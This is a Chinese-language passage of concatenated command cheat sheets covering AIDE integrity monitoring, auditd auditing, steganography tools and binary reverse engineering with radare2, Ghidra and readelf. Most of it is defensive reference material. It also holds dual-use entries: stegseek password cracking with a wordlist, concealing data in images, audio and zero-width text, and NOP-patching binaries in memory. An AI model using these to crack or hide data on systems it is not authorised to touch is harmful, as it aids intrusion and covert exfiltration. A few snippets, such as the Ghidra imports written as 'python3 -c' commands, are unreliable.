grep "added:" /tmp/aide-report.txt
```

**基本写法:提取删除文件**
`grep "removed:" <报告文件>`
```bash
# 提取所有被删除文件
grep "removed:" /tmp/aide-report.txt
```

**基本写法:提取权限变更**
`grep -E "perm|user|group" <报告文件>`
```bash
# 查找权限与属主变更
grep -E "perm|user|group|acl" /tmp/aide-report.txt
```

---

## AIDE 定时任务

**基本写法:每日定时检查**
`crontab -e`
```bash
# 添加每天凌晨 3 点执行检查的定时任务
# 0 3 * * * /usr/bin/aide --check --report=file:/var/log/aide/aide-$(date +\%F).log
```

**基本写法:周报生成**
`crontab -e`
```bash
# 每周一 4 点生成周报告
# 0 4 * * 1 /usr/bin/aide --check > /var/log/aide/weekly-$(date +\%F).html
```

**基本写法:检查后邮件通知**
`crontab -e`
```bash
# 检查完成后发送邮件
# 0 3 * * * /usr/bin/aide --check | mail -s "AIDE 报告 $(date)" admin@example.com
```

**基本写法:检查异常退出处理**
`crontab -e`
```bash
# 检查异常时发送告警邮件
# 0 3 * * * /usr/bin/aide --check --report=file:/tmp/aide.log || mail -s "AIDE 告警" admin@example.com < /tmp/aide.log
```

**基本写法:定期更新数据库**
`crontab -e`
```bash
# 每月 1 号更新数据库
# 0 3 1 * * /usr/bin/aide --update && cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db
```

---

## AIDE 规则定制

**基本写法:自定义哈希算法**
`<规则名> = p+i+n+sha256+sha512`
```bash
# 配置使用 SHA256 与 SHA512 哈希
# CONTENT_HASH = p+i+n+sha256+sha512
```

**基本写法:启用 SELinux 属性检查**
`<规则名> = p+selinux`
```bash
# 检查 SELinux 上下文变化
# SELINUX_RULE = p+i+n+selinux
```

**基本写法:启用 ACL 检查**
`<规则名> = p+acl+xattrs`
```bash
# 检查 ACL 与扩展属性
# ACL_RULE = p+i+n+acl+xattrs
```

**基本写法:排除特定文件类型**
`!<路径>/*.tmp`
```bash
# 排除临时文件
# !/var/log/.*.log
# !/tmp/.*
# !/var/tmp/.*
```

**基本写法:针对不同目录设置不同规则**
`<路径> <规则>`
```bash
# 关键目录严格检查,日志目录宽松检查
# /etc p+i+n+u+g+s+m+c+acl+selinux+sha512
# /bin p+i+n+u+g+s+m+c+sha512
# /var/log p+i+n+u+g
```

---

## AIDE 与监控集成

**基本写法:集成到 Nagios 监控**
`check_aide.sh`
```bash
# Nagios 检查脚本
# #!/bin/bash
# RESULT=$(sudo aide --check 2>&1 | tail -1)
# if echo "$RESULT" | grep -q "All files match"; then
#     echo "OK - AIDE check passed"
#     exit 0
# else
#     echo "CRITICAL - AIDE detected changes"
#     exit 2
# fi
```

**基本写法:集成到 Zabbix**
`zabbix-agentd.conf`
```bash
# Zabbix 自定义监控项
# UserParameter=aide.check,sudo /usr/bin/aide --check 2>&1 | grep -c "changed:"
```

**基本写法:集成到 Prometheus**
`aide_exporter.py`
```bash
# 通过脚本暴露 AIDE 指标
# #!/usr/bin/env python3
# import subprocess
# result = subprocess.run(['sudo', 'aide', '--check'], capture_output=True, text=True)
# changed = result.stdout.count('changed:')
# print(f'aide_files_changed {changed}')
```

**基本写法:与 SIEM 联动**
`rsyslog.conf`
```bash
# 将 AIDE 日志转发到 SIEM
# if $programname == 'aide' then @@siem.example.com:514
```

---

## AIDE 安全最佳实践

**基本写法:数据库离线存储**
`scp /var/lib/aide/aide.db <安全主机>:<路径>`
```bash
# 将数据库复制到离线主机存储
scp /var/lib/aide/aide.db admin@secure-host:/backup/aide.db
```

**基本写法:只读介质存储**
`cp /var/lib/aide/aide.db /media/cdrom/`
```bash
# 将数据库写入只读介质防止篡改
cp /var/lib/aide/aide.db /mnt/readonly/
```

**基本写法:数字签名数据库**
`gpg --sign /var/lib/aide/aide.db`
```bash
# 使用 GPG 对数据库签名
gpg --sign /var/lib/aide/aide.db
```

**基本写法:验证数据库签名**
`gpg --verify /var/lib/aide/aide.db.gpg`
```bash
# 验证数据库签名是否被篡改
gpg --verify /var/lib/aide/aide.db.gpg
```

**基本写法:关键系统文件检查清单**
`cat /etc/aide/aide.conf | grep -E "^/" | head -20`
```bash
# 查看当前监控的关键路径
grep -E "^/" /etc/aide/aide.conf | head -20
```



<!-- ============ 文档分隔线：033-cybersecurity/058-AuditdCommands.md ============ -->


## auditd 服务管理

**基本写法:启动 auditd 服务**
`systemctl start auditd`
```bash
# 启动 auditd 审计服务
sudo systemctl start auditd
sudo systemctl enable auditd
```

**基本写法:查看服务状态**
`systemctl status auditd`
```bash
# 查看 auditd 服务运行状态
sudo systemctl status auditd
```

**基本写法:重启 auditd 服务**
`systemctl restart auditd`
```bash
# 重启 auditd 服务
sudo systemctl restart auditd
```

**基本写法:重载规则配置**
`systemctl reload auditd`
```bash
# 重新加载 auditd 配置不中断服务
sudo systemctl reload auditd
```

**基本写法:查看 auditd 版本**
`auditd -v`
```bash
# 查看 auditd 版本信息
auditd -v
```

---

## 审计规则管理

**基本写法:查看已加载规则**
`auditctl -l`
```bash
# 查看当前已加载的所有审计规则
sudo auditctl -l
```

**基本写法:添加文件监控规则**
`auditctl -w <文件> -p <权限> -k <键值>`
```bash
# 监控 /etc/passwd 文件的读写与属性变更
sudo auditctl -w /etc/passwd -p rwa -k passwd_change
```

**基本写法:监控目录**
`auditctl -w <目录> -p <权限> -k <键值>`
```bash
# 监控 /etc 目录所有变化
sudo auditctl -w /etc/ -p wa -k etc_changes
```

**基本写法:监控系统调用**
`auditctl -a always,exit -S <系统调用> -F <过滤条件> -k <键值>`
```bash
# 监控 unlink 系统调用记录文件删除
sudo auditctl -a always,exit -S unlink -S unlinkat -F auid>=1000 -k file_delete
```

**基本写法:删除规则**
`auditctl -d <规则>`
```bash
# 删除指定审计规则
sudo auditctl -d -w /etc/passwd -p rwa -k passwd_change
```

**基本写法:清空所有规则**
`auditctl -D`
```bash
# 清空所有已加载审计规则
sudo auditctl -D
```

---

## 审计规则配置文件

**基本写法:查看规则配置**
`cat /etc/audit/audit.rules`
```bash
# 查看持久化审计规则配置
cat /etc/audit/audit.rules
```

**基本写法:添加持久化规则**
`echo '<规则>' >> /etc/audit/audit.rules`
```bash
# 添加永久审计规则
echo '-w /etc/passwd -p rwa -k passwd_change' | sudo tee -a /etc/audit/audit.rules
```

**基本写法:重载规则文件**
`augenrules --load`
```bash
# 从 rules.d 目录加载规则
sudo augenrules --load
```

**基本写法:测试规则配置**
`augenrules --check`
```bash
# 检查规则配置文件语法
sudo augenrules --check
```

**基本写法:查看规则目录**
`ls /etc/audit/rules.d/`
```bash
# 列出 rules.d 目录中的规则文件
ls -l /etc/audit/rules.d/
```

---

## 审计日志查询

**基本写法:查看所有审计日志**
`cat /var/log/audit/audit.log`
```bash
# 查看审计日志文件
sudo tail -n 100 /var/log/audit/audit.log
```

**基本写法:按键值查询**
`ausearch -k <键值>`
```bash
# 查询特定键值的审计事件
sudo ausearch -k passwd_change
```

**基本写法:按时间查询**
`ausearch -ts <开始时间> -te <结束时间>`
```bash
# 查询指定时间范围的审计事件
sudo ausearch -ts today
sudo ausearch -ts "2026-07-31 10:00:00" -te "2026-07-31 12:00:00"
```

**基本写法:按用户查询**
`ausearch -ua <UID>`
```bash
# 查询特定用户的活动
sudo ausearch -ua 1000
```

**基本写法:按事件类型查询**
`ausearch -m <事件类型>`
```bash
# 查询登录相关审计事件
sudo ausearch -m LOGIN
```

---

## 审计报告生成

**基本写法:生成摘要报告**
`aureport`
```bash
# 生成审计日志摘要报告
sudo aureport
```

**基本写法:生成失败事件报告**
`aureport --failed`
```bash
# 生成所有失败事件报告
sudo aureport --failed
```

**基本写法:生成成功事件报告**
`aureport --success`
```bash
# 生成所有成功事件报告
sudo aureport --success
```

**基本写法:生成用户报告**
`aureport -u`
```bash
# 生成按用户分类的报告
sudo aureport -u
```

**基本写法:生成文件访问报告**
`aureport -f`
```bash
# 生成文件访问报告
sudo aureport -f
```

**基本写法:生成命令执行报告**
`aureport -x`
```bash
# 生成执行命令报告
sudo aureport -x | head -20
```

---

## 审计日志分析

**基本写法:统计登录失败次数**
`aureport --failed --summary -i`
```bash
# 统计失败事件概要
sudo aureport --failed --summary -i
```

**基本写法:查看登录失败用户**
`aureport -u --failed -i | awk '{print $4}' | sort | uniq -c`
```bash
# 统计登录失败用户排行
sudo aureport -u --failed -i | awk '{print $4}' | sort | uniq -c | sort -rn | head
```

**基本写法:查找可疑文件访问**
`ausearch -k <键值> | grep -i "denied\|error"`
```bash
# 查找被拒绝的文件访问
sudo ausearch -k etc_changes | grep -i "denied\|error"
```

**基本写法:统计系统调用频率**
`ausearch -m SYSCALL | grep -oE "syscall=[0-9]+" | sort | uniq -c | sort -rn`
```bash
# 统计系统调用频率排行
sudo ausearch -m SYSCALL | grep -oE "syscall=[0-9]+" | sort | uniq -c | sort -rn | head
```

**基本写法:监控特定进程**
`ausearch -sc <系统调用> | grep <进程名>`
```bash
# 查找特定进程的系统调用
sudo ausearch -sc execve | grep "nginx"
```

---

## 高级审计规则

**基本写法:监控特权命令执行**
`auditctl -a always,exit -F path=<命令路径> -F perm=x -k <键值>`
```bash
# 监控 sudo 命令执行
sudo auditctl -a always,exit -F path=/usr/bin/sudo -F perm=x -k privilege
```

**基本写法:监控用户切换**
`auditctl -w /bin/su -p x -k user_switch`
```bash
# 监控 su 命令使用
sudo auditctl -w /bin/su -p x -k user_switch
```

**基本写法:监控 SSH 登录**
`auditctl -w /var/log/lastlog -p wa -k ssh_login`
```bash
# 监控 SSH 登录事件
sudo auditctl -w /var/log/lastlog -p wa -k ssh_login
```

**基本写法:监控内核模块加载**
`auditctl -w /sbin/insmod -p x -k module_load`
```bash
# 监控内核模块加载
sudo auditctl -w /sbin/insmod -p x -k module_load
sudo auditctl -w /sbin/modprobe -p x -k module_load
```

**基本写法:监控权限变更**
`auditctl -a always,exit -S chmod -S chown -F auid>=1000 -k perms`
```bash
# 监控文件权限变更
sudo auditctl -a always,exit -S chmod -S chown -S chmodat -F auid>=1000 -k perms
```

---

## 审计日志轮转

**基本写法:查看日志轮转配置**
`cat /etc/audit/auditd.conf`
```bash
# 查看 auditd 配置文件
cat /etc/audit/auditd.conf | grep -i "max\|rotate\|size"
```

**基本写法:配置日志大小限制**
`num_logs = <数量>`
```bash
# 保留 10 个日志文件
# num_logs = 10
# max_log_file = 50
# max_log_file_action = rotate
```

**基本写法:手动轮转日志**
`kill -USR1 $(pidof auditd)`
```bash
# 手动触发日志轮转
sudo kill -USR1 $(pidof auditd)
```

**基本写法:压缩归档日志**
`gzip /var/log/audit/audit.log.1`
```bash
# 压缩归档日志文件
sudo gzip /var/log/audit/audit.log.1
```

**基本写法:清理旧日志**
`find /var/log/audit/ -name "audit.log.*" -mtime +30 -delete`
```bash
# 删除 30 天前的归档日志
sudo find /var/log/audit/ -name "audit.log.*" -mtime +30 -delete
```

---

## 审计性能优化

**基本写法:查看审计速率限制**
`auditctl -s | grep rate`
```bash
# 查看审计日志速率限制
sudo auditctl -s
```

**基本写法:设置速率限制**
`auditctl -r <每秒条数>`
```bash
# 限制每秒最多记录 100 条
sudo auditctl -r 100
```

**基本写法:设置缓冲区大小**
`auditctl -b <缓冲区大小>`
```bash
# 设置审计缓冲区为 8192 条
sudo auditctl -b 8192
```

**基本写法:设置积压阈值**
`auditctl -f <级别>`
```bash
# 设置积压失败级别(2 为打印到控制台)
sudo auditctl -f 2
```

**基本写法:查看审计状态**
`auditctl -s`
```bash
# 查看 auditd 运行状态与参数
sudo auditctl -s
```

---

## 审计规则模板

**基本写法:监控所有 sudo 操作**
`auditctl -w /var/log/sudo.log -p wa -k sudo_log`
```bash
# 监控 sudo 日志文件变化
sudo auditctl -w /var/log/sudo.log -p wa -k sudo_log
```

**基本写法:监控 cron 任务变更**
`auditctl -w /etc/crontab -p wa -k cron_change`
```bash
# 监控计划任务变更
sudo auditctl -w /etc/crontab -p wa -k cron_change
sudo auditctl -w /etc/cron.d/ -p wa -k cron_change
```

**基本写法:监控网络配置变更**
`auditctl -w /etc/network/ -p wa -k network_change`
```bash
# 监控网络配置文件变更
sudo auditctl -w /etc/network/ -p wa -k network_change
sudo auditctl -w /etc/hosts -p wa -k network_change
```

**基本写法:监控 SSH 配置变更**
`auditctl -w /etc/ssh/sshd_config -p wa -k ssh_config`
```bash
# 监控 SSH 配置文件变更
sudo auditctl -w /etc/ssh/sshd_config -p wa -k ssh_config
```

**基本写法:监控用户与组变更**
`auditctl -w /etc/passwd -p wa -k user_change`
```bash
# 监控用户和组文件变更
sudo auditctl -w /etc/passwd -p wa -k user_change
sudo auditctl -w /etc/shadow -p wa -k user_change
sudo auditctl -w /etc/group -p wa -k user_change
```



<!-- ============ 文档分隔线：033-cybersecurity/059-SteganographyTools.md ============ -->


## Steghide 隐写工具

**基本写法:嵌入数据到图像**
`steghide embed -cf <载体文件> -ef <隐藏文件>`
```bash
# 将 secret.txt 嵌入到图片中
steghide embed -cf image.jpg -ef secret.txt
```

**基本写法:使用密码嵌入**
`steghide embed -cf <载体文件> -ef <隐藏文件> -p <密码>`
```bash
# 使用指定密码嵌入数据
steghide embed -cf image.jpg -ef secret.txt -p mypassword
```

**基本写法:提取隐藏数据**
`steghide extract -sf <载体文件>`
```bash
# 从图片中提取隐藏数据
steghide extract -sf image.jpg
```

**基本写法:使用密码提取**
`steghide extract -sf <载体文件> -p <密码>`
```bash
# 使用密码提取隐藏数据
steghide extract -sf image.jpg -p mypassword
```

**基本写法:查看隐藏信息**
`steghide info <载体文件>`
```bash
# 查看载体文件是否包含隐藏数据
steghide info image.jpg
```

**基本写法:嵌入时压缩数据**
`steghide embed -cf <载体文件> -ef <隐藏文件> -z <级别>`
```bash
# 使用最高压缩级别嵌入数据
steghide embed -cf image.jpg -ef secret.txt -z 9
```

---

## stegseek 爆破工具

**基本写法:使用字典爆破**
`stegseek --seed <载体文件> <字典文件>`
```bash
# 使用字典爆破 steghide 密码
stegseek --seed image.jpg rockyou.txt
```

**基本写法:爆破并提取**
`stegseek --seed <载体文件> <字典文件> -xf <输出文件>`
```bash
# 爆破成功后提取到指定文件
stegseek --seed image.jpg rockyou.txt -xf extracted.txt
```

**基本写法:无字典暴力破解**
`stegseek --seed <载体文件> --crack`
```bash
# 不使用字典直接暴力破解
stegseek --seed image.jpg --crack
```

**基本写法:指定线程数**
`stegseek --seed <载体文件> <字典文件> -t <线程数>`
```bash
# 使用 8 线程加速爆破
stegseek --seed image.jpg rockyou.txt -t 8
```

**基本写法:查看爆破进度**
`stegseek --seed <载体文件> <字典文件> -v`
```bash
# 显示详细爆破进度
stegseek --seed image.jpg rockyou.txt -v
```

---

## zsteg PNG/BMP 分析

**基本写法:分析 PNG 隐写**
`zsteg <PNG文件>`
```bash
# 自动分析 PNG 文件中的隐藏数据
zsteg image.png
```

**基本写法:分析指定通道**
`zsteg -a <PNG文件>`
```bash
# 分析所有通道的隐藏数据
zsteg -a image.png
```

**基本写法:提取 LSB 数据**
`zsteg -e "b1,rgb,lsb,xy" <PNG文件>`
```bash
# 提取 LSB 编码的隐藏数据
zsteg -e "b1,rgb,lsb,xy" image.png
```

**基本写法:仅检查特定通道**
`zsteg -c "rgb" <PNG文件>`
```bash
# 仅检查 RGB 通道
zsteg -c "rgb" image.png
```

**基本写法:输出原始数据**
`zsteg -E "b1,rgb,lsb,xy" <PNG文件> > <输出文件>`
```bash
# 提取隐藏数据并保存到文件
zsteg -E "b1,rgb,lsb,xy" image.png > extracted.bin
```

---

## binwalk 固件分析

**基本写法:扫描文件中的嵌入数据**
`binwalk <文件>`
```bash
# 扫描文件中嵌入的文件签名
binwalk firmware.bin
```

**基本写法:提取嵌入文件**
`binwalk -e <文件>`
```bash
# 自动提取文件中的嵌入数据
binwalk -e firmware.bin
```

**基本写法:递归提取**
`binwalk -eM <文件>`
```bash
# 递归提取所有嵌套的嵌入文件
binwalk -eM firmware.bin
```

**基本写法:指定提取目录**
`binwalk -e -C <目录> <文件>`
```bash
# 指定提取输出目录
binwalk -e -C /tmp/extracted firmware.bin
```

**基本写法:搜索指定签名**
`binwalk -R "<签名>" <文件>`
```bash
# 搜索指定的文件签名
binwalk -R "PK" firmware.bin
```

**基本写法:显示熵分析**
`binwalk -E <文件>`
```bash
# 显示文件熵分析图(检测加密数据)
binwalk -E firmware.bin
```

---

## foremost 文件恢复

**基本写法:恢复删除的文件**
`foremost -i <输入文件> -o <输出目录>`
```bash
# 从镜像文件恢复已删除文件
foremost -i disk.img -o /tmp/recovered
```

**基本写法:指定文件类型**
`foremost -t <类型> -i <输入文件> -o <输出目录>`
```bash
# 仅恢复图片与文档文件
foremost -t jpg,png,pdf,doc -i disk.img -o /tmp/recovered
```

**基本写法:从设备恢复**
`foremost -i /dev/sda1 -o <输出目录>`
```bash
# 从分区设备恢复文件
sudo foremost -i /dev/sda1 -o /tmp/recovered
```

**基本写法:详细模式恢复**
`foremost -v -i <输入文件> -o <输出目录>`
```bash
# 详细模式显示恢复进度
foremost -v -i disk.img -o /tmp/recovered
```

**基本写法:指定配置文件**
`foremost -c <配置文件> -i <输入文件>`
```bash
# 使用自定义规则文件恢复
foremost -c /etc/foremost.conf -i disk.img
```

---

## exiftool 元数据分析

**基本写法:查看 EXIF 信息**
`exiftool <图片文件>`
```bash
# 查看图片所有 EXIF 元数据
exiftool image.jpg
```

**基本写法:提取 GPS 信息**
`exiftool -gps* <图片文件>`
```bash
# 提取图片中的 GPS 位置信息
exiftool -gps* image.jpg
```

**基本写法:删除所有元数据**
`exiftool -all= <图片文件>`
```bash
# 删除图片所有元数据保护隐私
exiftool -all= image.jpg
```

**基本写法:批量删除元数据**
`exiftool -all= -r <目录>`
```bash
# 递归删除目录下所有图片元数据
exiftool -all= -r /path/to/images/
```

**基本写法:查看注释字段**
`exiftool -comment -description <图片文件>`
```bash
# 查看图片注释字段是否含隐藏信息
exiftool -comment -description image.jpg
```

**基本写法:写入隐藏信息**
`exiftool -comment="<隐藏信息>" <图片文件>`
```bash
# 在 EXIF 注释字段写入信息
exiftool -comment="hidden message" image.jpg
```

---

##音频隐写分析

**基本写法:使用 sonic-visualiser 分析**
`sonic-visualiser <音频文件>`
```bash
# 使用 sonic-visualiser 分析音频频谱
sonic-visualise audio.wav
```

**基本写法:提取音频 LSB**
`python3 -c "import wave; w=wave.open('<文件>'); print(w.readframes(w.getnframes()))"`
```bash
# Python 提取音频数据用于分析
python3 -c "import wave; w=wave.open('audio.wav'); data=w.readframes(w.getnframes()); print(data[:100])"
```

**基本写法:使用 stegolsb 嵌入**
`python3 -m stegolsb -h`
```bash
# 使用 stegolsb 在音频中嵌入数据
python3 -m stegolsb LSBAudioSteg -i audio.wav -s secret.txt -o output.wav -n 2
```

**基本写法:频谱图分析**
`sox <音频文件> -n spectrogram`
```bash
# 生成音频频谱图分析隐藏信息
sox audio.wav -n spectrogram -o spectrogram.png
```

**基本写法:提取音频元数据**
`exiftool <音频文件>`
```bash
# 查看音频文件元数据
exiftool audio.mp3
```

---

## 文本隐写工具

**基本写法:零宽字符隐写**
`python3 -c "print('text' + chr(0x200b) + 'hidden')"`
```bash
# 使用零宽字符隐藏信息
python3 -c "print('正常文本' + chr(0x200b) + chr(0x200c) + '隐藏信息')"
```

**基本写法:Snow 空格隐写**
`snow -C -m "<消息>" -p <密码> <输入文件> <输出文件>`
```bash
# 使用 snow 在文本末尾空格中隐藏信息
snow -C -m "secret message" input.txt output.txt
```

**基本写法:Snow 提取信息**
`snow -C -p <密码> <文件>`
```bash
# 从文本中提取 snow 隐藏的信息
snow -C -p password output.txt
```

**基本写法:Base64 隐藏**
`echo "<消息>" | base64`
```bash
# 使用 Base64 编码隐藏文本信息
echo "hidden message" | base64
```

**基本写法:Unicode 转义隐藏**
`python3 -c "print('\\u4f60\\u597d')"`
```bash
# 使用 Unicode 转义隐藏文本
python3 -c "print('显示文本\\u200b隐藏文本')"
```

---

## 隐写检测工具

**基本写法:使用 stegdetect 检测**
`stegdetect <图片文件>`
```bash
# 检测 JPEG 文件中的隐写
stegdetect image.jpg
```

**基本写法:指定敏感度**
`stegdetect -t <级别> <图片文件>`
```bash
# 设置检测敏感度(1-3)
stegdetect -t 3 image.jpg
```

**基本写法:批量检测**
`stegdetect *.jpg`
```bash
# 批量检测目录中的所有 JPEG 文件
stegdetect *.jpg
```

**基本写法:使用 stegexpose 检测**
`python3 stegexpose.py <图片>`
```bash
# 使用 stegexpose 检测图片隐写
python3 stegexpose.py image.png
```

**基本写法:文件熵分析**
`python3 -c "import math; data=open('<文件>','rb').read(); print(-sum(data.count(b)/len(data)*math.log2(data.count(b)/len(data)) for b in set(data) if data.count(b)))"`
```bash
# 计算文件熵值检测是否含加密数据
python3 -c "import math; data=open('image.jpg','rb').read(); ent=-sum(data.count(bytes([b]))/len(data)*math.log2(data.count(bytes([b]))/len(data)) for b in range(256) if data.count(bytes([b]))); print(f'熵值: {ent:.2f}')"
```

---

## 文件指纹与对比

**基本写法:计算图片哈希**
`md5sum <图片文件>`
```bash
# 计算 MD5 哈希用于对比
md5sum image.jpg
```

**基本写法:对比原图与隐写图**
`diff <原图哈希> <新图哈希>`
```bash
# 对比文件大小与哈希
ls -la original.jpg stego.jpg
md5sum original.jpg stego.jpg
```

**基本写法:查看文件大小差异**
`stat -c "%s %n" <文件1> <文件2>`
```bash
# 对比两个文件大小
stat -c "%s %n" original.jpg stego.jpg
```

**基本写法:十六进制对比**
`xxd <文件1> > /tmp/hex1; xxd <文件2> > /tmp/hex2; diff /tmp/hex1 /tmp/hex2`
```bash
# 十六进制对比两个文件差异
xxd original.jpg > /tmp/hex1.txt
xxd stego.jpg > /tmp/hex2.txt
diff /tmp/hex1.txt /tmp/hex2.txt | head
```

**基本写法:像素差异分析**
`python3 -c "from PIL import Image; img1=Image.open('<文件1>'); img2=Image.open('<文件2>'); print(img1.size, img2.size)"`
```bash
# Python 对比图片像素差异
python3 -c "
from PIL import Image
img1=Image.open('original.jpg')
img2=Image.open('stego.jpg')
diff=sum(1 for p1,p2 in zip(img1.getdata(),img2.getdata()) if p1!=p2)
print(f'差异像素数: {diff}')
"
```



<!-- ============ 文档分隔线：033-cybersecurity/060-ReverseEngineering.md ============ -->


## radare2 基础操作

**基本写法:打开二进制文件**
`r2 <文件>`
```bash
# 使用 radare2 打开可执行文件
r2 ./binary
```

**基本写法:以分析模式打开**
`r2 -A <文件>`
```bash
# 打开时自动分析所有函数
r2 -A ./binary
```

**基本写法:不进入交互模式执行命令**
`r2 -q -c "<命令>" <文件>`
```bash
# 执行命令后退出
r2 -q -c "iI" ./binary
```

**基本写法:查看文件信息**
`iI`
```bash
# 在 radare2 中查看文件基本信息
iI
```

**基本写法:查看入口点**
`ie`
```bash
# 查看程序入口点地址
ie
```

**基本写法:查看节区信息**
`iS`
```bash
# 查看二进制文件的节区
iS
```

---

## radare2 函数分析

**基本写法:列出所有函数**
`afl`
```bash
# 列出所有分析的函数
afl
```

**基本写法:反汇编指定函数**
`pdf @ <函数名>`
```bash
# 反汇编 main 函数
pdf @ main
```

**基本写法:反汇编指定地址**
`pd 20 @ <地址>`
```bash
# 反汇编指定地址 20 条指令
pd 20 @ 0x08048456
```

**基本写法:查看函数调用图**
`agf @ <函数名>`
```bash
# 查看 main 函数的控制流图
agf @ main
```

**基本写法:重命名函数**
`afn <新名称> <地址>`
```bash
# 重命名指定地址的函数
afn my_function 0x08048456
```

**基本写法:分析函数交叉引用**
`axt @ <地址>`
```bash
# 查找调用指定地址的代码位置
axt @ sym.imp.printf
```

---

## radare2 字符串与数据

**基本写法:查看所有字符串**
`iz`
```bash
# 列出数据节区中的字符串
iz
```

**基本写法:查看所有字符串(全文件)**
`izz`
```bash
# 列出整个文件中的字符串
izz
```

**基本写法:搜索字符串**
`/<字符串>`
```bash
# 在文件中搜索指定字符串
/password
```

**基本写法:搜索十六进制模式**
`/x <十六进制>`
```bash
# 搜索十六进制字节模式
/x 4889e5
```

**基本写法:查看指定地址数据**
`px 64 @ <地址>`
```bash
# 查看指定地址 64 字节的十六进制
px 64 @ 0x08048456
```

**基本写法:查看指定地址为字符串**
`ps @ <地址>`
```bash
# 以字符串形式查看指定地址数据
ps @ 0x08048456
```

---

## radare2 调试功能

**基本写法:启动调试模式**
`r2 -d <文件>`
```bash
# 以调试模式打开程序
r2 -d ./binary
```

**基本写法:设置断点**
`db <地址>`
```bash
# 在指定地址设置断点
db 0x08048456
```

**基本写法:运行程序**
`dc`
```bash
# 继续运行程序直到断点
dc
```

**基本写法:单步执行**
`ds`
```bash
# 单步执行一条指令
ds
```

**基本写法:查看寄存器**
`dr`
```bash
# 查看所有寄存器值
dr
```

**基本写法:查看栈内容**
`px 64 @ esp`
```bash
# 查看栈顶 64 字节内容
px 64 @ esp
```

---

## radare2 内存分析

**基本写法:查看内存映射**
`dm`
```bash
# 查看进程内存映射
dm
```

**基本写法:查看堆内容**
`px 128 @ <堆地址>`
```bash
# 查看堆内存内容
px 128 @ 0x0804a000
```

**基本写法:修改内存**
`wx <十六进制> @ <地址>`
```bash
# 修改指定地址的内存内容
wx 9090 @ 0x08048456
```

**基本写法:写入字符串**
`w <字符串> @ <地址>`
```bash
# 在指定地址写入字符串
w "hello" @ 0x0804a000
```

**基本写法:搜索内存**
`/<模式> @ <地址> <长度>`
```bash
# 在内存中搜索模式
/e flag @ 0x0804a000 0x1000
```

---

## Ghidra 命令行操作

**基本写法:启动 Ghidra GUI**
`ghidraRun`
```bash
# 启动 Ghidra 图形界面
ghidraRun
```

**基本写法:启动分析器**
`analyzeHeadless <项目目录> <项目名> -import <文件>`
```bash
# 使用 Ghidra 无界面分析二进制文件
analyzeHeadless /tmp/ghidra_project MyProject -import ./binary
```

**基本写法:运行 Ghidra 脚本**
`analyzeHeadless <项目目录> <项目名> -process <文件> -postScript <脚本>`
```bash
# 分析后运行指定脚本
analyzeHeadless /tmp/ghidra_project MyProject -process binary -postScript DecompileAllFunctions.java
```

**基本写法:导出分析结果**
`analyzeHeadless <项目目录> <项目名> -process <文件> -postScript <导出脚本>`
```bash
# 导出反编译结果到文件
analyzeHeadless /tmp/ghidra_project MyProject -process binary -postScript ExportDecompilation.java "output_dir"
```

**基本写法:运行 Python 脚本**
`analyzeHeadless <项目目录> <项目名> -process <文件> -postScript <Python脚本>`
```bash
# 使用 Python 脚本进行批量分析
analyzeHeadless /tmp/ghidra_project MyProject -process binary -postScript AnalyzeFunctions.py
```

---

## Ghidra 脚本编写

**基本写法:Python 反编译脚本**
`python3 -c "from ghidra import DecompInterface; ..."`
```bash
# Ghidra Python 脚本批量反编译
# from ghidra import DecompInterface
# decomp = DecompInterface()
# decomp.openProgram(currentProgram)
# for func in currentProgram.getFunctionManager().getFunctions(True):
#     result = decomp.decompileFunction(func, 30, None)
#     print(result.getDecompiledFunction().getC())
```

**基本写法:列出所有函数**
`python3 -c "from ghidra import *; ..."`
```bash
# Ghidra 脚本列出所有函数
# fm = currentProgram.getFunctionManager()
# for func in fm.getFunctions(True):
#     print(func.getName(), func.getEntryPoint())
```

**基本写法:导出字符串**
`python3 -c "from ghidra import *; ..."`
```bash
# 导出二进制中所有字符串
# from ghidra.program.util import DefinedDataIterator
# for data in DefinedDataIterator.definedStrings(currentProgram):
#     print(data.getValue())
```

**基本写法:分析交叉引用**
`python3 -c "from ghidra import *; ..."`
```bash
# 分析函数的交叉引用
# from ghidra.program.model.symbol import RefType
# rm = currentProgram.getReferenceManager()
# for ref in rm.getReferencesTo(addr):
#     print(ref.getFromAddress())
```

---

## objdump 反汇编工具

**基本写法:反汇编全部代码**
`objdump -d <文件>`
```bash
# 反汇编所有代码段
objdump -d ./binary
```

**基本写法:反汇编指定段**
`objdump -d -j <段名> <文件>`
```bash
# 仅反汇编 .text 段
objdump -d -j .text ./binary
```

**基本写法:查看符号表**
`objdump -t <文件>`
```bash
# 查看所有符号表
objdump -t ./binary
```

**基本写法:查看节区头**
`objdump -h <文件>`
```bash
# 查看所有节区头信息
objdump -h ./binary
```

**基本写法:显示源代码混合**
`objdump -S <文件>`
```bash
# 混合显示源代码与反汇编(需调试信息)
objdump -S ./binary
```

**基本写法:显示重定位信息**
`objdump -R <文件>`
```bash
# 查看动态重定位表
objdump -R ./binary
```

---

## 其他逆向工具

**基本写法:使用 strings 提取字符串**
`strings <文件>`
```bash
# 提取可执行文件中的字符串
strings ./binary
```

**基本写法:指定最小长度**
`strings -n <长度> <文件>`
```bash
# 提取长度至少为 8 的字符串
strings -n 8 ./binary
```

**基本写法:使用 file 检测类型**
`file <文件>`
```bash
# 检测文件类型与架构
file ./binary
```

**基本写法:使用 nm 查看符号**
`nm <文件>`
```bash
# 查看二进制符号表
nm ./binary
```

**基本写法:使用 ldd 查看依赖**
`ldd <文件>`
```bash
# 查看动态链接库依赖
ldd ./binary
```

**基本写法:使用 strace 跟踪系统调用**
`strace <程序>`
```bash
# 跟踪程序的系统调用
strace ./binary
```

**基本写法:使用 ltrace 跟踪库调用**
`ltrace <程序>`
```bash
# 跟踪程序的库函数调用
ltrace ./binary
```

---

## ELF 文件分析

**基本写法:查看 ELF 头**
`readelf -h <文件>`
```bash
# 查看 ELF 文件头信息
readelf -h ./binary
```

**基本写法:查看程序头**
`readelf -l <文件>`
```bash
# 查看 ELF 程序头表
readelf -l ./binary
```

**基本写法:查看节区头**
`readelf -S <文件>`
```bash
# 查看 ELF 节区头表
readelf -S ./binary
```

**基本写法:查看动态段**
`readelf -d <文件>`
```bash
# 查看 ELF 动态段信息
readelf -d ./binary
```

**基本写法:查看符号表**
`readelf -s <文件>`
```bash
# 查看 ELF 符号表
readelf -s ./binary
```

---

## PE 文件分析

**基本写法:使用 pefile 分析 PE**
`python3 -c "import pefile; pe=pefile.PE('<文件>'); print(pe)"`
```bash
# Python 分析 PE 文件
